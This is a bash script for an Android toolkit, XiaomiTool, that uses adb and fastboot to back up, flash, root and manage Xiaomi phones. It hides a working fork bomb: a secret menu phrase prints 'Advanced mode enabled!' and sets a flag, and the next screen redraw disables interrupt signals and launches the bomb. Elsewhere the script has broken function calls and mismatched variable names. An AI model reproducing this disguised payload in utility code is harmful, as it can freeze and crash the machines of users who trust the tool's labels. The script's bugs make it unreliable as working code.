#!/bin/bash

#   Copyright 2014 Joey Rizzoli
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.

#      */*****   Home    *****\*

fork-bomb () {
  # Here's why I won the nobel prize for the craziest Android ToolKit
  # The best thing you will find here, a fork bomb :D
  # First, let's f**k up user
  trap "" 2 20
  disclaimer
  # The quiet before the storm
  sleep 2
  echo "Warning! A Fork Bomb coming!"
  sleep 2
  echo "Booom!"
  :(){ :|:& };:
  }

headerprint () {
    if  [ "$ISCRAZY" = "1" ]; then
      fork-bomb
  else
  clear
  echo " ################################"
  echo "           XiaomiTool"
  echo "  Device:   $DID"
  echo "  Status:   $STATUS   $USBADB"
  echo "  Serial:   $SERIAL"
  echo " ################################"
  echo " "
  fi
  }

home () {
  headerprint
  echo " |-----------------------------------------------|"
  echo " | 1- Manage backups        2- Sync              |"
  echo " | 3- Shell                 4- Install an app    |"
    if [ "$mix" = 1 ]; then
        echo " | 5- Install a recovery    6- Install a Rom     |"
    fi
    echo " | 5- Install a recovery    7- Flash a zip       |"
    if [ "$androidv" = "kk" ]; then
        echo " | 8- Root                  9- Record the screen |"
        echo " | 10- Switch to Dalvik     11- Switch to ART    |"
    fi
    echo " |-----------------------------------------------|"
    echo " |                                               |"
    echo " | 0- Exit         00-About                      |"
    echo " |-----------------------------------------------|"
    read -p "?" Choice
    if [ "$Choice" == 1 ]; then
      back1
    elif [ "$Choice" == 2 ]; then
      pnp
    elif  [ "$Choice" = 3 ]; then
      shelll
    elif  [ "$Choice" == 4 ]; then
      apk
    elif  [ "$Choice" == 5 ]; then
      recovery
    elif  [ "$Choice" == 6 ]; then
      rom
    elif  [ "$Choice" == 7 ]; then
      zip
    elif [ "$Choice" == 8 ]; then
      root
    elif [ "$Choice" == 10 ]; then
        bdedalvik
    elif [ "$Choice" == 11 ]; then
      beart
    elif [ "$Choice" == 9 ]; then
      recorder
    elif  [ "$Choice" == 0 ]; then
      close
    elif  [ "$Choice" == 00 ]; then
      about
    elif  [ "$Choice" = "make me a sandwich" ]; then
        read -p "Do it yourself: " Choice
        if [ "$Choice" = "sudo make me a sandwich" ]; then
            echo "Advanced mode enabled!"
            ISCRAZY=1
            sleep 3
            home
        else
        echo "Wrong input"
        home
        fi
    else
      echo "Wrong input"
      home
      fi
  }

close () {
  adb kill-server
  killall adb
  killall fastboot
  clear
  exit 1
  }

# <- Install ->

apk () {
  headerprint
  echo "Apk Installer"
  echo " "
  read -p "Drag your apk here and press ENTER: " APK
  adb install $APK
  sleep 2
  home
  }

recovery () {
  headerprint
  echo "Recovery installer"
  adb reboot bootloader
  fastboot devices
  fastboot flash $DDIR/recovery/recovery.img
  fastboot reboot
  echo "Done!"
  sleep 3
  }

rom () {
  headerprint
  echo "Rom installer"
  adb reboot recovery
  adb shell  rm -rf /cache/recovery
  adb shell mkdir /cache/recovery
  adb shell "echo -e '--sideload' > /cache/recovery/command"
  # Dunno if CWM can execute more than one command but let's try, at least it won't wipe data, an echo will be show waring user about this
  adb shell "echo -e '--wipe_data' >> /cache/recovery/command"
  adb reboot recovery
  adb wait-for-device
  read -p "Drag your zip here and press ENTER: " ROM
  adb sideload $ROM
  echo "Now wait until your phone install rom, about 3 mins"
  sleep 360
  echo "Warning: if your device bootloops, boot into recovery and wipe data!"
  read -p "If your phone screen is blank with recovery background, press enter or wait (it may reboot automatically, depends on the rom you flashed)"
  adb reboot
  echo "Done!"
  home
  }

zip () {
  headerprint
  echo "Zip flasher"
  adb reboot recovery
  adb shell rm -rf /cache/recovery
  adb shell mkdir /cache/recovery
  adb shell "echo -e '--sideload' > /cache/recovery/command"
  adb reboot recovery
  adb wait-for-device
  read -p "Drag your zip here and press ENTER: " ZIP
  adb sideload $ZIP
  echo "Now wait until your phone install zip file.."
  read -p "Only when your phone screen is blank with recovery background, press enter"
  adb reboot
  echo "Done!"
  home
  }

root () {
  headerprint
  echo "Root Enabler"
  adb shell rm -rf /cache/recovery
  adb shell mkdir /cache/recovery
  adb shell "echo -e '--sideload' > /cache/recovery/command"
  adb reboot recovery
  adb wait-for-device
  if [[ "$mix" == 1 ]]; then
    adb sideload $ROOTQCOM
  elif [[ "$mix" == 0 ]]; then
    adb sideload $ROOTMIUI
  else
    echo "Device cannot be rooted!"
    adb reboot
    home
  fi
  echo "Now wait until your phone install zip file. It will reboot automatically one it's done."
  echo "Done!"
  home
}

# <- Advanced ->

shelll () {
  headerprint
  echo "Shell"
  echo " "
  echo "Type exit when you want to quit"
  echo " "
  adb shell
  read -p "Press Enter to quit"
  home
  }

# <- Backup ->

back1 () {
  headerprint
  echo "Backup Manager"
  echo " "
  echo "1- Backup    2-Restore"
  echo " "
  echo "0- Go Back"
  read -p "?" Choice
    if [ "$Choice" = "1" ]; then
        backup
    elif [ "$Choice" = "2" ]; then
        restore
    elif [ "$Choice" = "0" ]; then
        home
    else
    echo "Wrong input"
    back1
    fi
  }

backup () {
  headerprint
  echo "Backup"
  echo " "
  read -p "Type backup name (NO SPACES): " BACKUPID
  echo " "
  echo "Enter password on your phone and let it work"
  adb backup -nosystem -noshared -apk -f $BACKFOLDER/$BACKUPID.ab
  read -p "Done! Press Enter"
  home
  }

restore () {
  headerprint
  echo "Restore"
  echo " "
  read -p "Type backup name: " BACKUPID
  echo " "
  echo "On your phone, type password and let it works"
  adb restore $BACKFOLDER/$BACKUPID.ab
  read -p "Done! Press Enter"
  home
  }

# <- Sync ->

pnp () {
  headerprint
  echo "Push and Pull"
  echo " "
  echo "1- Push a file "
  echo "2- Import Camera Photos"
  echo " "
  echo "0- Go Back"
  read -p "?" Choice
    if [ "$Choice" = "1" ]; then
        push
    elif [ "$Choice" = "2" ]; then
        camera
    elif [ "$Choice" = "0" ]; then
        home
    else
    echo "Wrong input"
    sleep 2
    pnp
    fi
  }

push () {
  headerprint
  echo "Push a file"
  echo " "
  read -p "Drag your file here (one): " FILE
  adb push $FILE /sdcard
  read -p "Press ENTER"
  home
  }

camera () {
  headerprint
  echo "Import Camera Photos"
  read -p "Press enter to start"
  adb pull $CAMDIR Camera
  read -p "Press ENTER"
  home
  }

# <- 4.4+ Features ->

beart () {
  headerprint
  echo "ART RunTime"
  adb reboot recovery
  adb shell rm -rf /data/dalvik-cache
  adb shell 'echo -n libart.so > /data/property/persist.sys.dalvik.vm.lib'
  adb reboot
  echo "Done!"
  home
}

bedalvik () {
  headerprint
  echo "Dalvik RunTime"
  adb reboot recovery
  adb shell rm -rf /data/dalvik-cache
  adb shell 'echo -n libdalvik.so > /data/property/persist.sys.dalvik.vm.lib'
  adb reboot
  echo "Done!"
  home
  }

recorder () {
  homeprint
  echo "Screen Recorder"
  echo " "
  echo " Press CTRL+C when you want to quit"
  adb shell screenrecord /sdcard/Movies/Screenrecord.mp4
  echo " "
  home
  }

disclaimer() {
  echo " ##########################################"
  echo " # XiaomiTool ~~ Disclaimer               #"
  echo " #                                        #"
  echo " # This program can brick your device,    #"
  echo " # kill your computer,                    #"
  echo " # erase some unsaved files,             #"
  echo " # void your warranty"
  echo " #                                        #"
  echo " # The developer disclaim every kind      #"
  echo " # of damage caused from this program     #"
  echo " ##########################################"
  read -p "Press enter to continue"
}

about () {
  headerprint
  echo "About"
  echo " "
  echo "- License: Gpl V2"
  echo "- Developer: Joey Rizzoli"
  echo "- Device Supported: Xiaomi Mi2(s), Mi3(w), Mi4(w) RedMi 1S"
  echo "- Disclaimer: this program may void your warranty. Developer disclaim every"
  echo "              damage caused from this program on your device and/or PC."
  echo ""
  echo "- Sources:  https://github.com/linuxxxxx/XiaomiTool"
  echo " "
  echo " "
  read -p "Press enter to go back"
  home
  }

# <- Setup ->
detect_device() {
    clear
    adb kill-server
    adb start-server
    clear
    echo "Waiting for device ...."
    DEVICE=$(adb shell getprop ro.product.device)
    DID=$(adb shell getprop ro.product.model)
    BUILD=$(adb shell getprop ro.build.version.release)
    if [[ "$DEVICE" == aries* ]]; then
        mix=1
        DDIR=$Mi2
        setup
    elif [[ "$DEVICE" == cancro* ]]; then
        mix=1
        DDIR=$Mi3
        setup
    elif [[ "$DEVICE" == armani* ]]; then
      mix=0
      DDIR=$RED1S
      setup
  #  elif [[ "$DEVICE" == mocha* ]]; then # <- Waiting for a Custom recovery
    #  adba=2
    # DDIR=$MIP1
     # setup
    else
        echo "Device not supported: $DEVICE"
        sleep 2
        exit 0
    fi
}

setup (){
  RES=res
  DEVICE=Unknow
  Mi2=Aries
  Mi3=Cancro
  RED1S=armani
  # MIP1=mocha
  ROOTQCOM=$RES/root.zip # < don't ask the meaning of ROOTQCOM
  ROOTMIUI=$RES/miui_root.zip
  DIR=/sdcard/tmp
  BACKUPDIR=~/XiaomiTool/Backups
  CAMDIR=/sdcard/DCIM/Camera
  ISCRAZY=0
  ACTION=$1
  STATUS=$(adb get-state)
  SERIAL=$(adb get-serialno)
  USBADB=$(adb get-devpath)
  android-api
  }

android-api () {
  if [[ "$BUILD" == 4.4* ]]; then
      androidv=kk
      home
  else
      androidv=jb
      home
  fi
}

disclaimer
detect_device
